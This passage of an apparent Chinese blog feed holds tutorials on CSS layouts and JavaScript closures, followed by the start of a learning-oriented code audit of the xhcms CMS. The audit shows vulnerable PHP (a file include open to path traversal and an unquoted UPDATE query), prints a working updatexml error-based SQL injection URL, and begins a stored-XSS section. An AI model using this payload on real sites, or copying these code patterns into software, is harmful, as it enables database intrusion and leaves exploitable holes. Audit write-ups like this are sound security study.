class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span>主体<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span>底部<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/htmlstyle/1562847435896.png" alt="1562847435896"></p><p>还有一种就是单列的布局就是： 宽度自适应内容居中布局，这种布局的特点就是：</p><ul><li><p>头部，和底部自适应页面的宽度，</p></li><li><p>主体固定宽度，要实现这种方式的布局思路：</p><p>1.将头部和尾部放在独立的容器中，</p><p>2.头部和尾部的内容和主体等度</p><p>3.主体仍单独放在单独的容器中，并设置水平居中</p><p>4.调整DOM结构</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--容器--&gt;</span></span><br><span class="line">   </span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>= <span class="string">"head"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">"conter"</span>&gt;</span> 头部 <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">"conter"</span>&gt;</span>主体 <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"footer"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> = <span class="string">"conter"</span>&gt;</span> 底部<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/htmlstyle/1562848937251.png" alt="1562848937251"></p><p>可以发现他们的内容已经变成了自适应了也就是用矩形框圈的那部分</p><h3 id="两列布局"><a href="#两列布局" class="headerlink" title="两列布局"></a>两列布局</h3><p>两列布局有4种方式，</p><p>1.左侧固定右侧自适应</p><p>2.两列左右固定中间撑开父级块</p><p>3.右侧固定左侧自适应</p><p>4.两列左右两列绝对定位</p><p>先实现第1种</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    .left&#123;</span><br><span class="line">        width: 200px;</span><br><span class="line">        height: 600px;</span><br><span class="line">        float: left;</span><br><span class="line">        background-color: cadetblue;</span><br><span class="line">    &#125;</span><br><span class="line">    .main&#123;</span><br><span class="line">        height: 600px;</span><br><span class="line">        background-color: blueviolet;</span><br><span class="line">        margin-left: 220px;/*大于等于左侧的宽度就行*/</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 1.左侧固定并设置左浮动 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 右侧主体部分设置一个右边框，它的宽度只要大于等于左边的宽度就可以 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>左侧<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span>主体<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/htmlstyle/562849915137.png" alt="1562849915137"></p><p>接下来说第3种右侧固定左边主体自适应，这个思路跟左边类似同理可得：</p><p><img src="/images/htmlstyle/1562850154381.png" alt="1562850154381"></p><p>现在来看一下第2种两列左右固定中间撑开父级块，这种实现的思路就是：两边采取浮动的方式定义一个父级块这里要考虑一个问题就是如何用子块来撑开父级块。这里采用的是利用after伪类让子块撑开父块。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    .content&#123;</span><br><span class="line">        width: 960px;</span><br><span class="line">        margin: 0 auto;</span><br><span class="line">        background-color:burlywood;</span><br><span class="line">        overflow: hidden;</span><br><span class="line">    &#125;</span><br><span class="line">    .clear&#123;</span><br><span class="line">        -ms-zoom: 1;</span><br><span class="line">    &#125;</span><br><span class="line">    .clear:after&#123;</span><br><span class="line">        content: &apos;&apos;;</span><br><span class="line">        display: block;</span><br><span class="line">        clear: both;</span><br><span class="line">    &#125;</span><br><span class="line">    .left&#123;</span><br><span class="line">        width: 200px;</span><br><span class="line">        height: 600px;</span><br><span class="line">        background-color: aqua;</span><br><span class="line">        float: left;</span><br><span class="line">    &#125;</span><br><span class="line">    .right&#123;</span><br><span class="line">        width: 750px;</span><br><span class="line">        height: 600px;</span><br><span class="line">        background-color:rgb(13, 210, 224);</span><br><span class="line">        float: right;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;content clear&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;left&quot;&gt;左侧&lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;right&quot;&gt;右侧&lt;/div&gt;</span><br><span class="line">      </span><br><span class="line">    &lt;/div&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/htmlstyle/1562851770177.png" alt="1562851770177"></p><h3 id="三列布局"><a href="#三列布局" class="headerlink" title="三列布局"></a>三列布局</h3><p>1左右两列绝对定位，中间适应布局</p><p>特点：</p><ul><li><p>左右两列固定宽度</p></li><li><p>中间主体区自适应</p></li><li><p>采用浮动加外边距</p></li><li><p>区块的顺序非常重要</p><p>左右这里需要注意的就是先写左右在写主体，DOM顺序不能乱。，中间实际区域是用margin挤压出来，左右两边采用浮动+宽度，</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">        .left&#123;</span><br><span class="line">            width:200px;</span><br><span class="line">            height: 600px;</span><br><span class="line">            background-color:brown;</span><br><span class="line">            float: left;</span><br><span class="line">        &#125;</span><br><span class="line">        .right&#123;</span><br><span class="line">            width:200px;</span><br><span class="line">            height: 600px;</span><br><span class="line">            background-color:brown;</span><br><span class="line">            float: right;</span><br><span class="line">        &#125;</span><br><span class="line">        .main&#123;</span><br><span class="line">            height: 600px;</span><br><span class="line">            margin-left: 200px;</span><br><span class="line">            margin-right: 200px;</span><br><span class="line">            background-color: #fd8008;</span><br><span class="line">        &#125;</span><br><span class="line">   <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span>左侧<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span>右侧<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span>主体<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="/images/htmlstyle/1562854674592.png" alt="1562854674592"></p></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>每天都要有收获才行</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;在前端中布局显的非常重要，之前一直不怎么会布局今天抽空把之前学的总结一下便学习一下之前没有学到的然后记录下来，然后有了这篇文章。&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://onekingcc.github.io/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="页面布局" scheme="http://onekingcc.github.io/tags/%E9%A1%B5%E9%9D%A2%E5%B8%83%E5%B1%80/"/>
    
  </entry>
  
  <entry>
    <title>对闭包的一次理解</title>
    <link href="http://onekingcc.github.io/2020/06/03/%E5%AF%B9%E9%97%AD%E5%8C%85%E7%9A%84%E4%B8%80%E6%AC%A1%E6%8E%A2%E8%AE%A8/"/>
    <id>http://onekingcc.github.io/2020/06/03/对闭包的一次探讨/</id>
    <published>2020-06-03T14:28:13.020Z</published>
    <updated>2019-08-20T09:19:36.226Z</updated>
    
    <content type="html"><![CDATA[<h3 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h3><p>​    先了解变量作用域，因为变量根据作用域的不同分为全局作用域和局部作用域，可以简单的理解为在函数的内部称为局部变量，在函数外部称为全局作用域。在函数的内部是可以使用全局变量的，在函数外部是不可以访问函数内部的变量。当函数执行完毕之后，函数内的局部变量就会被销毁。</p><h3 id="什么是闭包"><a href="#什么是闭包" class="headerlink" title="什么是闭包"></a>什么是闭包</h3><p>这里引用JavaScript高级程序设计的：<strong>闭包（closure）就是指有权访问另一个函数作用域中变量的函数</strong></p><p>我理解的这句话 其实闭包就是函数，一个作用域可以访问另一个函数内的局部变量。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">var</span> num = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">          <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">              <span class="built_in">console</span>.log(num);<span class="comment">//2</span></span><br><span class="line">              </span><br><span class="line">          &#125;</span><br><span class="line">          fun();</span><br><span class="line">      &#125; </span><br><span class="line">      init();</span><br></pre></td></tr></table></figure><p>这里打印了2，很明显在fun()这个函数的作用域访问了init()里面的局部变量这里就产生了闭包，</p><p><img src="/images/js/1566286638315.png" alt="1566286638315"></p><p>发现init()就是我们的闭包函数里面num就是被访问的局部变量</p><h3 id="闭包的作用"><a href="#闭包的作用" class="headerlink" title="闭包的作用"></a>闭包的作用</h3><p>可以让我们init()外面的作用域可以访问init内部局部变量</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">          <span class="keyword">var</span> num = <span class="number">2</span>;</span><br><span class="line">          <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">              <span class="built_in">console</span>.log(num);</span><br><span class="line">              </span><br><span class="line">          &#125;</span><br><span class="line">         <span class="keyword">return</span> fun;</span><br><span class="line">      &#125; </span><br><span class="line">     <span class="keyword">var</span> i = init();</span><br><span class="line">  i();</span><br></pre></td></tr></table></figure><p>函数也是一种数据类型，所以也可以当做参数类型传递，同样也可以当值返回回来，这里调用了init()函数，就会有fun()函数的返回，这样就可以实现init()外面的作用域访问内部的作用域了。这里分析一下：一旦<code>init()</code>一调用就会去执行<code>function init()</code>里面的var  num = 2然后function fun()没调用所以 不执行，然后直接return fun。所以这里的var i =init()就是类似于：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(num);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的i就是相当于一个函数，这里如果访问了num=2是不是就是相当于就访问了内部的局部变量</p><p><img src="/images/js/1566288230773.png" alt="1566288230773"></p><p><img src="/images/js/1566288532991.png" alt="1566288532991"></p><p>这里发现我们i里面存的就是fun()这个函数，再一调用就会去执行fun函数里面的，一进去就会产生一个闭包指向init()函数值为2。</p><p><img src="/images/js/1566288857770.png" alt="1566288857770"></p><p>这里知道了闭包的作用就是：<strong>延伸了变量的作用范围</strong>以前函数内部的变量只能本函数使用，现在使用了闭包后我i()这个函数也能使用里面的变量。正常的函数就是当函数执行完毕之后，函数内的局部变量就会被销毁。但是这里当<code>var i = init()</code>执行完之后这里<strong>i()</strong>等着被调用要等被调用完之后num这个变量才被销毁。</p><h3 id="闭包应用"><a href="#闭包应用" class="headerlink" title="闭包应用"></a>闭包应用</h3><p>通过闭包的方式得到当前的li的值，这里通过立即执行函数来获取里面的值</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav"</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">li</span>&gt;</span>java<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">li</span>&gt;</span>c<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">li</span>&gt;</span>javascript<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">li</span>&gt;</span>python<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> lis = <span class="built_in">document</span>.querySelector(<span class="string">'.nav'</span>).querySelectorAll(<span class="string">'li'</span>);</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;lis.length;i++)&#123;</span><br><span class="line">           (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">               <span class="comment">// console.log(lis[i].innerHTML);</span></span><br><span class="line">               lis[i].onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                   <span class="built_in">console</span>.log(i);</span><br><span class="line">                   <span class="built_in">console</span>.log(lis[i].innerHTML);                    </span><br><span class="line">               &#125;</span><br><span class="line">           &#125;)(i);</span><br><span class="line">           </span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>这里的闭包是因为我的onclick事件后面是一个函数，而在外面我的function(i)也是一个立即执行函数，这里console.log的里面的i是function(i)里面穿过来的i所以就是我function里面的作用域去访问function(i)函数内的值。打个断点可以看一下，一点击就发现就会有我们的Clousure</p><p><img src="/images/js/1566291517388.png" alt="1566291517388"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;函数作用域&quot;&gt;&lt;a href=&quot;#函数作用域&quot; class=&quot;headerlink&quot; title=&quot;函数作用域&quot;&gt;&lt;/a&gt;函数作用域&lt;/h3&gt;&lt;p&gt;​    先了解变量作用域，因为变量根据作用域的不同分为全局作用域和局部作用域，可以简单的理解为在函数的内部称为局部
      
    
    </summary>
    
      <category term="js" scheme="http://onekingcc.github.io/categories/js/"/>
    
    
      <category term="javascript" scheme="http://onekingcc.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>记一次xhcms代码审计学习</title>
    <link href="http://onekingcc.github.io/2020/06/03/%E5%88%9D%E6%8E%A2%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1xhcms/"/>
    <id>http://onekingcc.github.io/2020/06/03/初探代码审计xhcms/</id>
    <published>2020-06-03T14:28:12.990Z</published>
    <updated>2020-11-14T06:36:12.947Z</updated>
    
    <content type="html"><![CDATA[<p>因为之前忙着公司的一些事情，一直没有完成自己的计划，今天有时间了打算写一下审计的过程，算是自己的代码审计的入坑，这里还是想读一下源码首先看一下该cms的目录结构，所以这里首先从入口文件进入index.php</p><p><img src="/images/xhcms/1576808222189.png" alt="1576808222189"></p><h3 id="任意文件包含"><a href="#任意文件包含" class="headerlink" title="任意文件包含"></a>任意文件包含</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//单一入口模式</span></span><br><span class="line">error_reporting(<span class="number">0</span>); <span class="comment">//关闭错误显示</span></span><br><span class="line">$file=addslashes($_GET[<span class="string">'r'</span>]); <span class="comment">//接收文件名</span></span><br><span class="line">$action=$file==<span class="string">''</span>?<span class="string">'index'</span>:$file; <span class="comment">//判断为空或者等于index</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">'files/'</span>.$action.<span class="string">'.php'</span>); <span class="comment">//载入相应文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里从GET传进一个参数r，传过来参数经过addslashes()处理会将用户传进来单引号（’）双引号(‘’)反斜线(/)与NUL转义掉</p><p>当传进的$file为空就会跳转到index.php，否则就会进入include包含。这里传进来的$file传进来的r是可控，然后直接带进include函数造成任意文件包含，这里发现是在files目录下的，但是并没有对目录进行判断可以用../来穿越目录。</p><p><img src="/images/xhcms/1576809383030.png" alt="1576809383030"></p><h3 id="update注入"><a href="#update注入" class="headerlink" title="update注入"></a>update注入</h3><p>这里继续跟进到files/index.php中看r这个参数传递到哪里了，全局搜索一下发现在34行处</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;?r=content&amp;cid=&lt;?php echo $toutiaoimg[&apos;id&apos;]?&gt;&quot; title=&quot;&lt;?php echo $toutiaoimg[&apos;title&apos;]?&gt;&quot;&gt;&lt;img src=&quot;&lt;?php echo $toutiaoimg[&apos;images&apos;]?&gt;&quot;&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>这里r=content 那么就会包含到content.php, 并且跟了一个cid的参数，这个cid是$toutiaoimg[‘id’]带进去的，然后再输出页面，这个去找一下$toutiaoimg这个变量</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"SELECT * FROM content WHERE images&lt;&gt;'' AND xs=1 ORDER BY id DESC  LIMIT 1"</span>;</span><br><span class="line">$resul = mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL语句有误：'</span>.mysql_error());</span><br><span class="line">$toutiaoimg = mysql_fetch_array($resul);</span><br></pre></td></tr></table></figure><p>发现就是”SELECT * FROM settings”的cid的值</p><p><img src="/images/xhcms/1576811811077.png" alt="1576811811077"></p><p>那么现在的访问的话就是<a href="http://localhost/xhcms/index.php?r=content&amp;cid=1继续跟进content.php看看cid这个参数" target="_blank" rel="noopener">http://localhost/xhcms/index.php?r=content&amp;cid=1继续跟进content.php看看cid这个参数</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require</span> <span class="string">'inc/conn.php'</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">'inc/time.class.php'</span>;</span><br><span class="line">$query = <span class="string">"SELECT * FROM settings"</span>;</span><br><span class="line">$resul = mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL语句有误：'</span>.mysql_error());</span><br><span class="line">$info = mysql_fetch_array($resul);</span><br><span class="line"></span><br><span class="line">$id=addslashes($_GET[<span class="string">'cid'</span>]);</span><br><span class="line">$query = <span class="string">"SELECT * FROM content WHERE id='$id'"</span>;</span><br><span class="line">$resul = mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL语句有误：'</span>.mysql_error());</span><br><span class="line">$content = mysql_fetch_array($resul);</span><br><span class="line"></span><br><span class="line">$navid=$content[<span class="string">'navclass'</span>];</span><br><span class="line">$query = <span class="string">"SELECT * FROM navclass WHERE id='$navid'"</span>;</span><br><span class="line">$resul = mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL语句有误：'</span>.mysql_error());</span><br><span class="line">$navs = mysql_fetch_array($resul);</span><br><span class="line"></span><br><span class="line"><span class="comment">//浏览计数</span></span><br><span class="line">$query = <span class="string">"UPDATE content SET hit = hit+1 WHERE id=$id"</span>;</span><br><span class="line">@mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'修改错误：'</span>.mysql_error());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$query=mysql_query(<span class="string">"select * FROM interaction WHERE (cid='$id' AND type=1 and xs=1)"</span>);</span><br><span class="line">$pinglunzs = mysql_num_rows($query)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里一共找到5处带有cid参数的第一处</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$id=addslashes($_GET[<span class="string">'cid'</span>]);</span><br><span class="line">$query = <span class="string">"SELECT * FROM content WHERE id='$id'"</span>;</span><br><span class="line">$resul = mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'SQL语句有误：'</span>.mysql_error());</span><br><span class="line">$content = mysql_fetch_array($resul);</span><br></pre></td></tr></table></figure><p>这里的对get传进来的cid参数然后用addslashes()函数转义，然后赋值给$id了，这里就如果想注入的话就需要闭合单引号(‘)绕过addslashes的转义需要的部分条件用GBK的方式，所以无法注入，再往下翻看到浏览计数的发现没有被引号包裹起来石锤注入了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"UPDATE content SET hit = hit+1 WHERE id=$id"</span>;</span><br><span class="line">@mysql_query($query) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'修改错误：'</span>.mysql_error());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>很明显的update注入，而且还有回显可以使用报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?r=content&amp;cid=1 or(updatexml(1,concat(0x7e,(select%20version()),0x7e),1))</span><br></pre></td></tr></table></figure><h3 id="存储XSS"><a href="#存储XSS" class="headerlink" title="存储XSS"></a>存储XSS</h3><p>接着往下搜索发现在评论内容处</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php?&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;plbt&quot;&gt;&lt;strong&gt;→ 和谐网络，文明发言！&lt;/strong&gt;发表评论：&lt;/div&gt;</span><br><span class="line">&lt;form  name=&quot;form&quot; method=&quot;post&quot; action=&quot;/?r=submit&amp;type=comment&amp;cid=&lt;?php echo $id?&gt;&quot;&gt;</span><br><span class="line">&lt;input name=&quot;cid&quot; type=&quot;hidden&quot; value=&quot;&lt;?php echo $id?&gt;&quot;/&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">&lt;li&gt;&lt;span&gt;昵称&lt;/span&gt;&lt;input name=&quot;name&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $_COOKIE[&apos;name&apos;]?&gt;&quot; /&gt;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;&lt;span&gt;邮箱&lt;/span&gt;&lt;input name=&quot;mail&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $_COOKIE[&apos;mail&apos;]?&gt;&quot;/&gt;&lt;/li&gt;</span><br><span class="line">&lt;li&gt;&lt;span&gt;网址&lt;/span&gt;&lt;input name=&quot;url&quot; type=&quot;text&quot; value=&quot;&lt;?php echo $_COOKIE[&apos;url&apos;]?&gt;&quot;/&gt;&lt;/li&gt;</span><br><span class="line">&lt;textarea name=&quot;content&quot; cols=&quot;&quot; rows=&quot;&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;input name=&quot;save&quot; type=&quot;submit&quot;  value=&quot;提交&quot; id=&quot;input2&quot;/&gt;</span><br><span class="line">&lt;div id=&quot;code&quot;&gt;&lt;span&gt;验证码&lt;/span&gt;&lt;input name=&quot;randcode&quot; type=&quot;text&quot; /&gt; &lt;span id=&quot;yspan&quot;&gt;&lt;img src=&quot;../inc/code.class.php&quot; onClick=&quot;this.src=this.src+&apos;?&apos;+Math.random();&quot; title=&quot;看不清楚?点击刷新验证码?&quot;&gt;&lt;/span&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;div 